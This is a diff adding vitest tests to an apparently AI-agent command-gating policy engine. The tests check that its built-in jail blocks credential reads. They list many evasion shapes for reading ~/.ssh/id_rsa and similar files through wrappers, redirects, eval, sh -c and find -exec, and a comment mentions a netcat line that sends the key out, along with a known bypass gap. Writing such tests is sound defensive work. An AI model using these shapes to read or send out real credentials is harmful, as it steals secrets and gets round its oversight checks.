@@ -26,12 +26,13 @@
 import { describe, it, expect, beforeAll, afterEach } from 'vitest';
 import fs from 'fs';
 import path from 'path';
-import { FS_READ_TOOLS, analyzeFsOperation } from '@node9/policy-engine';
+import { FS_READ_TOOLS, COMMAND_WRAPPERS, analyzeFsOperation } from '@node9/policy-engine';
 import {
   CLI,
   makeHome,
   runCli,
   probe,
+  seedBuiltinJailHome,
   explain,
   cleanup,
   writeConfig,
@@ -355,3 +356,101 @@ describe('AST tier — Windows path blindness (known gap)', () => {
     expect(analyzeFsOperation('cat /home/x/.ssh/id_rsa')?.verdict).toBe('block');
   });
 });
+
+/**
+ * Stage 2 — REACHABILITY, at the real gate, against the BUILT-IN jail.
+ *
+ * The blocks above probe a `jail add` path, which the user jail guards with a
+ * verb-agnostic regex over the raw command text. That regex already catches
+ * `env cat <jailed>`, so it cannot witness this bug. The built-in jail
+ * (`~/.ssh`, `~/.aws`, `.env`) is the AST tier, and the AST tier consulted its
+ * matcher only for a reader at argv[0] with the path in argv. Measured
+ * 2026-09-11, controls held: `env cat ~/.ssh/id_rsa` ALLOW, `cat < ~/.ssh/id_rsa`
+ * ALLOW, `eval "cat ~/.ssh/id_rsa"` ALLOW.
+ *
+ * Wrapper rows are DERIVED from `COMMAND_WRAPPERS`, the set the engine's chmod
+ * detector already unwraps with -- add a wrapper there and it gains a row here,
+ * the same rule the verb-axis block follows for `FS_READ_TOOLS`.
+ * Design: doc/jail-stage2-reachability-design.md.
+ */
+function builtinJailHome(): { home: string; key: string; plain: string } {
+  const seeded = seedBuiltinJailHome('node9-jail-reach-');
+  homes.push(seeded.home);
+  return seeded;
+}
+
+// skipIf(win32) for the same documented reason as the built-in-jail block
+// above: mvdan eats `\` as a POSIX escape, so the AST tier returns null for
+// every Windows-shaped path. Without this the Windows matrix spawns 40+ child
+// processes to watch them fail.
+describe.skipIf(process.platform === 'win32')(
+  'jail gauntlet — stage 2: the wrapper axis, derived from COMMAND_WRAPPERS',
+  () => {
+    it('controls: the built-in jail blocks a plain read and allows a plain file', () => {
+      const { home, key, plain } = builtinJailHome();
+      expect(probe(home, 'Bash', { command: `cat ${key}` }).verdict).toBe('block');
+      expect(probe(home, 'Bash', { command: `cat ${plain}` }).verdict).toBe('allow');
+    });
+    for (const wrapper of [...COMMAND_WRAPPERS].sort()) {
+      it(`shell: \`${wrapper} cat <key>\` is blocked`, () => {
+        const { home, key } = builtinJailHome();
+        const r = probe(home, 'Bash', { command: `${wrapper} cat ${key}` });
+        expect(r.error, 'spawn must not fail silently').toBeUndefined();
+        expect(r.status, `${wrapper} runs cat — the read must reach the jail`).toBe(2);
+        expect(r.verdict).toBe('block');
+      });
+      // The plain-file half is pinned per-wrapper at the engine
+      // (jail-reachability.spec.ts STAYS_QUIET); here it rides on the key row's
+      // own home so the axis costs one spawn per wrapper, not two.
+    }
+  }
+);
+
+// A deliberate SUBSET of packages/policy-engine/src/policy/jail-reachability.spec.ts:
+// that file is the full matrix at the engine; this block proves the shapes
+// survive the real gate (taint tier, DLP, approvers). Not derived on purpose.
+describe.skipIf(process.platform === 'win32')(
+  'jail gauntlet — stage 2: the redirect and string axes',
+  () => {
+    const REDIRECT_SHAPES: Array<[string, (k: string) => string]> = [
+      ['cat <', (k) => `cat < ${k}`],
+      ['read builtin', (k) => `read -r L < ${k}; echo $L`],
+      ['mapfile builtin', (k) => `mapfile -t A < ${k}`],
+      ['exec redirect', (k) => `exec < ${k}; cat`],
+      ['$(< file)', (k) => `Y=$(<${k}); echo $Y`],
+      ['while loop', (k) => `while read l; do echo $l; done < ${k}`],
+      ['tee', (k) => `tee /tmp/n9-reach < ${k}`],
+    ];
+    for (const [label, mk] of REDIRECT_SHAPES) {
+      it(`shell: ${label} on the key is blocked`, () => {
+        const { home, key } = builtinJailHome();
+        expect(probe(home, 'Bash', { command: mk(key) }).verdict).toBe('block');
+      });
+    }
+    // ⛔ `nc h 80 < key` is NOT here: `nc` is a network command, so the taint
+    // tier runs first, cannot reach the daemon, and its review pre-empts the
+    // jail's block. BUGS.md JAIL-7, pinned failing in taint-preempt.
+    it('shell: a redirect from a plain file stays allowed', () => {
+      const { home, plain } = builtinJailHome();
+      expect(probe(home, 'Bash', { command: `sort < ${plain}` }).verdict).toBe('allow');
+    });
+
+    const STRING_SHAPES: Array<[string, (k: string) => string]> = [
+      ['sh -c', (k) => `sh -c "cat ${k}"`],
+      ['bash -c', (k) => `bash -c "cat ${k}"`],
+      ['eval quoted', (k) => `eval "cat ${k}"`],
+      ['eval bare', (k) => `eval cat ${k}`],
+    ];
+    for (const [label, mk] of STRING_SHAPES) {
+      it(`shell: ${label} with a literal payload is blocked`, () => {
+        const { home, key } = builtinJailHome();
+        expect(probe(home, 'Bash', { command: mk(key) }).verdict).toBe('block');
+      });
+    }
+    it('shell: find -exec <reader> on the directory is blocked', () => {
+      const { home } = builtinJailHome();
+      const r = probe(home, 'Bash', { command: `find ${path.join(home, '.ssh')} -exec cat {} +` });
+      expect(r.verdict).toBe('block');
+    });
+  }
+);
